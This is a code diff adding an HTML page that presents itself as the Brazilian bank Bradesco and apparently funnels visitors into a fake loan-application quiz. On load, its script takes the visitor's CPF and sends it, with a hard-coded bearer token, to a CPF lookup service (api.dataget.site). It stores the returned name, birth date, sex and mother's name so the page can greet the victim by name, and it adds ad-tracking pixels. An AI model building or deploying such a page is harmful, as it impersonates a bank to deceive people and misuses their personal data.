@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bradesco - Processando Solicitação</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #ac0a2a;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #008b00;
+      overflow-x: hidden;
+    }
+
+    .loading-container {
+      text-align: center;
+      max-width: 600px;
+      padding: 60px 40px;
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 25px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+    }
+
+    .logo {
+      width: 160px;
+      height: auto;
+      margin-bottom: 40px;
+      opacity: 0;
+      animation: fadeInUp 1s ease-out 0.5s forwards;
+    }
+
+    .welcome-message {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 30px;
+      color: #ac0a2a;
+      opacity: 0;
+      animation: fadeInUp 1s ease-out 1s forwards;
+    }
+
+    .typewriter-container {
+      min-height: 120px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+
+    .typewriter-text {
+      font-size: 20px;
+      line-height: 1.6;
+      color: #6A7282;
+      font-weight: 500;
+      max-width: 500px;
+    }
+
+    .typewriter-cursor {
+      animation: blink 1s infinite;
+      color: #ac0a2a;
+      font-weight: bold;
+    }
+
+    .loading-dots {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 40px;
+      opacity: 0;
+      animation: fadeInUp 1s ease-out 2s forwards;
+    }
+
+    .dot {
+      width: 12px;
+      height: 12px;
+      background: linear-gradient(45deg, #ac0a2a, #ac0a2a);
+      border-radius: 50%;
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    .dot:nth-child(2) {
+      animation-delay: 0.3s;
+    }
+
+    .dot:nth-child(3) {
+      animation-delay: 0.6s;
+    }
+    .start-button {
+      background: linear-gradient(45deg, #ac0a2a, #ac0a2a);
+      color: white;
+      border: none;
+      padding: 18px 40px;
+      font-size: 18px;
+      font-weight: 600;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 30px rgba(193, 0, 0, 0.3);
+      opacity: 0;
+      transform: translateY(20px);
+      font-family: 'Inter', sans-serif;
+      min-width: 200px;
+    }
+
+    .start-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(193, 0, 0, 0.4);
+      background: linear-gradient(45deg, #ac0a2a, #ac0a2a);
+    }
+
+    .start-button:active {
+      transform: translateY(-1px);
+    }
+
+    .start-button.show {
+      animation: slideInUp 0.8s ease-out forwards;
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes slideInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+        opacity: 0.7;
+      }
+      50% {
+        transform: scale(1.3);
+        opacity: 1;
+      }
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: rgba(193, 0, 0, 0.2);
+      border-radius: 2px;
+      overflow: hidden;
+      margin-bottom: 30px;
+      opacity: 0;
+      animation: fadeInUp 1s ease-out 1.5s forwards;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(45deg, #ac0a2a, #ac0a2a);
+      border-radius: 2px;
+      width: 0%;
+      animation: fillProgress 3s ease-out 2s forwards;
+    }
+
+    @keyframes fillProgress {
+      to {
+        width: 100%;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .loading-container {
+        margin: 20px;
+        padding: 40px 20px;
+      }
+
+      .welcome-message {
+        font-size: 24px;
+      }
+
+      .typewriter-text {
+        font-size: 18px;
+      }
+
+      .start-button {
+        padding: 16px 30px;
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+    
+   <script>
+  window.pixelId = "6927e90b843a260eef2a0e49";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script> 
+    
+    
+    
+  <div class="loading-container">
+    <img src="images/bradesco.png" alt="Sicredi" class="logo">
+    
+    <div class="progress-bar">
+      <div class="progress-fill"></div>
+    </div>
+
+    <h1 class="welcome-message">
+      Olá, <span id="nomeUsuario">Cliente</span>!
+    </h1>
+
+    <div class="typewriter-container">
+      <div class="typewriter-text" id="typewriter"></div>
+    </div>
+
+    <div class="loading-dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <button class="start-button" id="startButton" onclick="iniciarQuiz()">
+      Continuar
+    </button>
+  </div>
+<script>
+// 🔎 Função para buscar nome (usa sessionStorage primeiro, e API só se necessário)
+async function consultarECarregarNome() {
+    console.log('=== INICIANDO CONSULTA DE NOME ===');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const nomeFromUrl = urlParams.get('nome');
+    const nomeCompletoFromUrl = urlParams.get('nomeCompleto');
+
+    // ✅ 1. Prioriza nome na URL (se existir)
+    if (nomeFromUrl && nomeFromUrl !== 'Cliente') {
+        console.log('✅ Nome da URL:', nomeFromUrl);
+        document.getElementById('nomeUsuario').textContent = decodeURIComponent(nomeFromUrl);
+        return decodeURIComponent(nomeFromUrl);
+    }
+
+    // ✅ 2. Verifica se já temos dados salvos no sessionStorage
+    const dadosSalvos = {
+        cpf: sessionStorage.getItem("cpf"),
+        primeiroNome: sessionStorage.getItem("primeiroNome"),
+        nomeCompleto: sessionStorage.getItem("nomeCompleto"),
+        dataNascimento: sessionStorage.getItem("dataNascimento")
+    };
+
+    if (dadosSalvos.primeiroNome && dadosSalvos.cpf) {
+        console.log("📁 Dados encontrados no sessionStorage:", dadosSalvos);
+        document.getElementById("nomeUsuario").textContent = dadosSalvos.primeiroNome;
+        return dadosSalvos.primeiroNome;
+    }
+
+    // ✅ 3. Caso não haja no sessionStorage, tenta obter CPF
+    const cpf = localStorage.getItem('cpf') || urlParams.get('cpf');
+    if (!cpf) {
+        console.log('❌ CPF não encontrado');
+        document.getElementById('nomeUsuario').textContent = 'Cliente';
+        return 'Cliente';
+    }
+
+    console.log('🌐 Nenhum dado salvo, consultando API DataGet para CPF:', cpf);
+
+    // ✅ 4. Consulta a API apenas se necessário
+    try {
+        const response = await fetch(`https://api.dataget.site/api/v1/cpf/${cpf.replace(/\D/g, '')}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer 5664016cd07486d17adea9f73884bf398a52b89593c33f114fd9c6bbddb3b26f'
+            }
+        });
+
+        if (response.ok) {
+            const data = await response.json();
+            console.log('📊 Dados da API:', data);
+
+            if (data?.NOME) {
+                const primeiroNome = data.NOME.split(' ')[0];
+
+                // 🧠 Salva no sessionStorage
+                sessionStorage.setItem('cpf', cpf);
+                sessionStorage.setItem('primeiroNome', primeiroNome);
+                sessionStorage.setItem('nomeCompleto', data.NOME);
+                sessionStorage.setItem('dataNascimento', data.NASC);
+
+                sessionStorage.setItem('dadosAdicionais', JSON.stringify({
+                    cpf: cpf,
+                    sexo: data.SEXO,
+                    nomeMae: data.NOME_MAE,
+                    nascimento: data.NASC
+                }));
+
+                document.getElementById('nomeUsuario').textContent = primeiroNome;
+                return primeiroNome;
+            } else {
+                console.warn('⚠️ Dados incompletos retornados da API');
+            }
+        } else {
+            console.error('❌ Erro ao consultar API:', response.status);
+        }
+    } catch (error) {
+        console.error('❌ Erro na requisição da API:', error);
+    }
+
+    // ✅ 5. Fallback: define "Cliente" se nada for encontrado
+    document.getElementById('nomeUsuario').textContent = 'Cliente';
+    return 'Cliente';
+}
+
+// ✨ Efeito de digitação
+function typeWriter(element, text, speed = 50) {
+    let i = 0;
+    element.innerHTML = '';
+    function type() {
+        if (i < text.length) {
+            element.innerHTML += text.charAt(i);
+            i++;
+            setTimeout(type, speed);
+        } else {
+            setTimeout(() => {
+                element.innerHTML += '<span class="typewriter-cursor">|</span>';
+                setTimeout(showStartButton, 1000);
+            }, 500);
+        }
+    }
+    type();
+}
+
+// ✅ Mostra o botão iniciar
+function showStartButton() {
+    const button = document.getElementById('startButton');
+    button.classList.add('show');
+}
+
+// 🚀 Redireciona para o quiz
+function iniciarQuiz() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmParams = urlParams.toString();
+    const fromTermos = document.referrer.includes('/termos/') || urlParams.has('from_termos');
+
+    let redirectUrl = '/quiz';
+    console.log('🔄 Redirecionando para quiz...');
+    if (utmParams) redirectUrl += '?' + utmParams;
+    window.location.href = redirectUrl;
+}
+
+// 🧠 Inicialização
+document.addEventListener('DOMContentLoaded', async function () {
+    console.log('🚀 Página carregada, iniciando...');
+    await consultarECarregarNome();
+
+    const fromTermos = document.referrer.includes('/termos/') ||
+        new URLSearchParams(window.location.search).has('from_termos');
+
+    const texto = fromTermos
+        ? "Perfeito! Agora estamos processando sua solicitação e preparando tudo para você."
+        : "Para concluirmos sua solicitação de empréstimo, precisamos fazer algumas perguntinhas rápidas.";
+
+    setTimeout(() => {
+        typeWriter(document.getElementById('typewriter'), texto, 50);
+    }, 1000);
+});
+</script>
+
+</body></html>
